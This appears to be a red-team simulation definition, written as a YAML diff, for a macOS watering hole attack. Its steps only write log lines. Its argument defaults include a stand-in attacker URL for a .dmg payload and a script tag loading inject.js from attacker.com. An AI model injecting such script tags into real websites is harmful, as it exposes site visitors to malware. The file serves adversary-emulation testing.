@@ -1,0 +1,86 @@
+id: ttp-043
+name: Watering Hole Attack
+uuid: 550e8400-e29b-41d4-a716-446655440043
+api_version: '2.0'
+platform: darwin
+category: initial_access
+description: Simulate watering hole attack by compromising frequently visited website to deliver malware payload
+author: TTPs Generator
+created: 2026-01-30
+
+args:
+  - name: target_website
+    description: URL of legitimate website to target
+    type: string
+    default: 'http://example.com'
+  - name: malware_url
+    description: URL hosting malware payload
+    type: string
+    default: 'http://attacker.com/malware.dmg'
+  - name: injection_point
+    description: HTML element to inject malware link into
+    type: string
+    default: '<script src="http://attacker.com/inject.js"></script>'
+  - name: payload_type
+    description: Type of payload (javascript, iframe, redirect)
+    type: string
+    default: javascript
+
+steps:
+  - name: Identify target website
+    description: Identify the watering hole target website
+    executor: sh
+    command: 'echo "Target website: ${target_website}" > /tmp/watering_hole.log'
+  
+  - name: Monitor web traffic
+    description: Simulate monitoring user access to target website
+    executor: sh
+    command: 'echo "Monitoring traffic to ${target_website}" >> /tmp/watering_hole.log'
+  
+  - name: Prepare malware injection
+    description: Prepare malware payload for injection
+    executor: sh
+    command: 'echo "${injection_point}" > /tmp/injection_payload.html && echo "Payload injection prepared" >> /tmp/watering_hole.log'
+  
+  - name: Simulate website compromise
+    description: Simulate compromising the website
+    executor: sh
+    command: 'echo "Website compromised at $(date)" >> /tmp/watering_hole.log'
+  
+  - name: Deploy malicious content
+    description: Deploy malicious content to visitors
+    executor: sh
+    command: 'echo "Malicious ${payload_type} deployed to target website" >> /tmp/watering_hole.log'
+
+checks:
+  - name: Injection point verification
+    description: Verify injection point was prepared
+    executor: sh
+    command: 'test -f /tmp/injection_payload.html && echo "PASS: Injection point ready" || echo "FAIL: Injection point missing"'
+  
+  - name: Website compromise confirmation
+    description: Verify website compromise was logged
+    executor: sh
+    command: 'grep -q "compromised" /tmp/watering_hole.log && echo "PASS: Compromise logged" || echo "FAIL: No compromise logged"'
+  
+  - name: Malware delivery verification
+    description: Verify malware delivery was simulated
+    executor: sh
+    command: 'grep -q "deployed" /tmp/watering_hole.log && echo "PASS: Delivery simulated" || echo "FAIL: No delivery logged"'
+
+tests:
+  - name: Watering hole attack test
+    description: Test watering hole attack simulation
+    dry_run: true
+    command: 'echo "DRY RUN: Would compromise ${target_website} and inject ${payload_type} payload from ${malware_url}"'
+
+cleanup:
+  - name: Remove injection payload
+    description: Clean up injection payload artifacts
+    executor: sh
+    command: 'rm -f /tmp/injection_payload.html'
+  
+  - name: Remove watering hole logs
+    description: Clean up watering hole simulation logs
+    executor: sh
+    command: 'rm -f /tmp/watering_hole.log'
